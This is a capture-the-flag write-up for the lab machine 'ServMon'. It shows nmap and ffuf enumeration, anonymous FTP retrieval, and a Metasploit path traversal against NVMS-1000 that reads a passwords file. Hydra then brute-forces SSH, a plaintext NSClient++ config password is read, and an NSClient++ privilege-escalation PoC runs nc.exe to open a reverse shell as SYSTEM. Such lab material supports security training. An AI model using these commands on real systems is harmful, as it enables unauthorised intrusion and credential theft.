## ServMon

### Lab Details 

- Difficulty: Easy
- Type: FTP, Web App, Brute Force, Priv Esc, Windows

#### Enumeration
- run nmap

```
PORT      STATE    SERVICE       REASON      VERSION
21/tcp    open     ftp           syn-ack     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp    open     ssh           syn-ack     OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLqFnd0LtYC3vPEYbWRZEOTBIpA++rGtx7C/R2/f2Nrro7eR3prZWUiZm0zoIEvjMl+ZFTe7UqziszU3tF8v8YeguZ5yGcWwkuJCCOROdiXt37INiwgFnRaiIGKg4hYzMcGrhQT/QVx53KZPNJHGuTl18yTlXFvQZjgPk1Bc/0JGw9C1Dx9abLs1zC03S4/sFepnECbfnTXzm28nNbd+VI3UUe5rjlnC4TrRLUMAtl8ybD2LA2919qGTT1HjUf8h73sGWdY9rrfMg4omua3ywkQOaoV/KWJZVQvChAYINM2D33wJJjngppp8aPgY/1RfVVXh/asAZJD49AhTU+1HSvBHO6K9/Bh6p0xWgVXhjuEd0KUyCwRqkvWAjxw5xrCCokjYcOEZ34fA+IkwPpK4oQE279/Y5p7niZyP4lFVl5cu0J9TfWUcavL44neyyNHNSJPOLSMHGgGs10GsfjqCdX0ggjhxc0RqWa9oZZtlVtsIV5WR6MyRsUPTV6N8NRDD8=
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA5iE0EIBy2ljOhQ42zqa843noU8K42IIHcRa9tFu5kUtlUcQ9CghqmRG7yrLjEBxJBMeZ3DRL3xEXH0K5rCRGY=
|   256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN6c7yYxNJoV/1Lp8AQeOGoJrtQ6rgTitX0ksHDoKjhn
80/tcp    open     http          syn-ack
|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds? syn-ack
1123/tcp  filtered murray        no-response
5666/tcp  open     tcpwrapped    syn-ack
6063/tcp  open     x11?          syn-ack
6699/tcp  open     napster?      syn-ack
8443/tcp  open     ssl/https-alt syn-ack
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-01-14T13:24:20
| Not valid after:  2021-01-13T13:24:20
| MD5:   1d03:0c40:5b7a:0f6d:d8c8:78e3:cba7:38b4
| SHA-1: 7083:bd82:b4b0:f9c0:cc9c:5019:2f9f:9291:4694:8334
| -----BEGIN CERTIFICATE-----
| MIICoTCCAYmgAwIBAgIBADANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAlsb2Nh
| bGhvc3QwHhcNMjAwMTE0MTMyNDIwWhcNMjEwMTEzMTMyNDIwWjAUMRIwEAYDVQQD
| DAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDXCoMi
| kUUWbCi0E1C/LfZFrm4UKCheesOFUAITOnrCvfkYmUR0o7v9wQ8yR5sQR8OIxfJN
| vOTE3C/YZjPE/XLFrLhBpb64X83rqzFRwX7bHVr+PZmHQR0qFRvrsWoQTKcjrElo
| R4WgF4AWkR8vQqsCADPuDGIsNb6PyXSru8/A/HJSt5ef8a3dcOCszlm2bP62qsa8
| XqumPHAKKwiu8k8N94qyXyVwOxbh1nPcATwede5z/KkpKBtpNfSFjrL+sLceQC5S
| wU8u06kPwgzrqTM4L8hyLbsgGcByOBeWLjPJOuR0L/a33yTL3lLFDx/RwGIln5s7
| BwX8AJUEl+6lRs1JAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBAAjXGVBKBNUUVJ51
| b2f08SxINbWy4iDxomygRhT/auRNIypAT2muZ2//KBtUiUxaHZguCwUUzB/1jiED
| s/IDA6dWvImHWnOZGgIUsLo/242RsNgKUYYz8sxGeDKceh6F9RvyG3Sr0OyUrPHt
| sc2hPkgZ0jgf4igc6/3KLCffK5o85bLOQ4hCmJqI74aNenTMNnojk42NfBln2cvU
| vK13uXz0wU1PDgfyGrq8DL8A89zsmdW6QzBElnNKpqNdSj+5trHe7nYYM5m0rrAb
| H2nO4PdFbPGJpwRlH0BOm0kIY0az67VfOakdo1HiWXq5ZbhkRm27B2zO7/ZKfVIz
| XXrt6LA=
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49668/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49669/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49670/tcp open     msrpc         syn-ack     Microsoft Windows RPC
```
- investigate port 80 
    - running NVMS-1000 on port 80 
    - searched for default credentials to no avail  
    - scan for directories
```
#directories
$ ffuf -u http://10.10.10.184:80/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.184:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

favicon.ico             [Status: 200, Size: 1150, Words: 16, Lines: 4, Duration: 367ms]
Favicon.ico             [Status: 200, Size: 1150, Words: 16, Lines: 4, Duration: 268ms]
Index.htm               [Status: 200, Size: 340, Words: 32, Lines: 13, Duration: 164ms]
favicon.ICO             [Status: 200, Size: 1150, Words: 16, Lines: 4, Duration: 466ms]
:: Progress: [17129/17129] :: Job [1/1] :: 59 req/sec :: Duration: [0:04:26] :: Errors: 314 ::
```
- investigate port 21
    - based on the output of nmap we can deduce that anonymous login is allowed
    - login to ftp as anonymous 
    - fetch all files from remote
```
$ wget -r -nH --cut-dirs=1 --no-parent ftp://10.10.10.184/                     
--2025-07-26 23:19:27--  ftp://10.10.10.184/
           => ‘.listing’
Connecting to 10.10.10.184:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

.listing                            [ <=>                                                 ]      46  --.-KB/s    in 0.1s    

==> PASV ... done.    ==> LIST ... done.

.listing                            [ <=>                                                 ]      46  --.-KB/s    in 0.1s    

2025-07-26 23:19:31 (743 B/s) - ‘.listing’ saved [92]
<snip>
```
- investigate port 8443
	- port 8443 is hosting an web app over HTTPS, upon page load the title states `NSClient++`
	- tried enumerate for directory nothing was found
#### Initial Foothold 
- searching NVMS 1000 vulnerability, directory transversal vulnerability from 2019 can be found: https://www.exploit-db.com/exploits/47774
- using msfconsole to exploit this vulnerability and since we know that there's a file named Passwords.txt at user Nathan's desktop we can try to retrieve it using the directory traversal vunerability
```
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > options

Module options (auxiliary/scanner/http/tvt_nvms_traversal):

   Name       Current Setting                Required  Description
   ----       ---------------                --------  -----------
   DEPTH      13                             yes       Depth for Path Traversal
   FILEPATH   /users/Nathan/Desktop/passwor  yes       The path to the file to read
              ds.txt
   Proxies                                   no        A proxy chain of format type:host:port[,type:host:po
                                                       rt][...]
   RHOSTS     http://10.10.10.184            yes       The target host(s), see https://docs.metasploit.com/
                                                       docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                             yes       The target port (TCP)
   SSL        false                          no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                              yes       The base URI path of nvms
   THREADS    1                              yes       The number of concurrent threads (max one per host)
   VHOST                                     no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/tvt_nvms_traversal) > run
[+] 10.10.10.184:80 - Downloaded 156 bytes
[+] File saved in: /home/kali/.msf4/loot/20250726235100_default_10.10.10.184_nvms.traversal_527816.txt
[*] Scanned 1 of 1 hosts (100% complete)
```
- we can use hydra to match the correct password with the known users
```
$ hydra -L usernames.txt -P passwords.txt ssh://10.10.10.184 -t 4 -vV

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-27 00:08:57
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14 login tries (l:2/p:7), ~4 tries per task
[DATA] attacking ssh://10.10.10.184:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://Nathan@10.10.10.184:22
[INFO] Successful, password authentication is supported by ssh://10.10.10.184:22
[ATTEMPT] target 10.10.10.184 - login "Nathan" - pass "1nsp3ctTh3Way2Mars!" - 1 of 14 [child 0] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nathan" - pass "Th3r34r3To0M4nyTrait0r5!" - 2 of 14 [child 1] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nathan" - pass "B3WithM30r4ga1n5tMe" - 3 of 14 [child 2] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nathan" - pass "L1k3B1gBut7s@W0rk" - 4 of 14 [child 3] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nathan" - pass "0nly7h3y0unGWi11F0l10w" - 5 of 14 [child 0] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nathan" - pass "IfH3s4b0Utg0t0H1sH0me" - 6 of 14 [child 1] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nathan" - pass "Gr4etN3w5w17hMySk1Pa5$" - 7 of 14 [child 2] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nadine" - pass "1nsp3ctTh3Way2Mars!" - 8 of 14 [child 3] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nadine" - pass "Th3r34r3To0M4nyTrait0r5!" - 9 of 14 [child 0] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nadine" - pass "B3WithM30r4ga1n5tMe" - 10 of 14 [child 1] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nadine" - pass "L1k3B1gBut7s@W0rk" - 11 of 14 [child 2] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nadine" - pass "0nly7h3y0unGWi11F0l10w" - 12 of 14 [child 3] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nadine" - pass "IfH3s4b0Utg0t0H1sH0me" - 13 of 14 [child 0] (0/0)
[ATTEMPT] target 10.10.10.184 - login "Nadine" - pass "Gr4etN3w5w17hMySk1Pa5$" - 14 of 14 [child 0] (0/0)
[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk                                            
[STATUS] attack finished for 10.10.10.184 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-27 00:09:09
```
 - we can use the found credential to login to the server via `ssh`
#### Lateral Movement (If any)

#### Privilege Escalation
- load and execute `winpeas.exe` on target
```
+----------¦ Installed Applications --Via Program Files/Uninstall registry--                                                       
+ Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalatio
n/index.html#applications                                                                                                                            
    C:\Program Files\Common Files 
    C:\Program Files\desktop.ini 
    C:\Program Files\internet explorer                                                                                                    
    C:\Program Files\MSBuild                                                                                                              
    C:\Program Files\NSClient++                                                                                                           
    C:\Program Files\NVMS-1000                                                                                                            
    C:\Program Files\OpenSSH-Win64                                                                                                        
    C:\Program Files\Reference Assemblies                            <snip>
```
- output of `winpeas.exe` states that `NSClient++` is located at ` C:\Program Files\NSClient++`
- search onlined and found the config file is located at `C:\Program Files\NSClient++\nsclient.in` 
- we can find the password to `NSClient++` in the config file
```
PS C:\Program Files\NSClient++> cat nsclient.ini
# If you want to fill this file with all available options run the following command: 
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT
```
- check version of `NSClient++`
```
PS C:\Program Files\NSClient++> ./nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```
- searched online and found POC for the version of `NSClient++` : https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation/tree/master
- in order for the script to work first we need to port forward the application so the script can access the app locally
```
$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```
- then execute the script, we will get `NT Authority\System`
```
$ python3 ./privsec.py "C:\\Users\\Nadine\\Desktop\\nc.exe 10.1
Added exploit1 as scripts\exploit1.bat

$ nc -lvnp 9001                                                   
listening on [any] 9001 ...
connect to [10.10.16.20] from (UNKNOWN) [10.10.10.184] 49762
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami 
whoami
nt authority\system
```
#### Resources

#### Lesson Learned
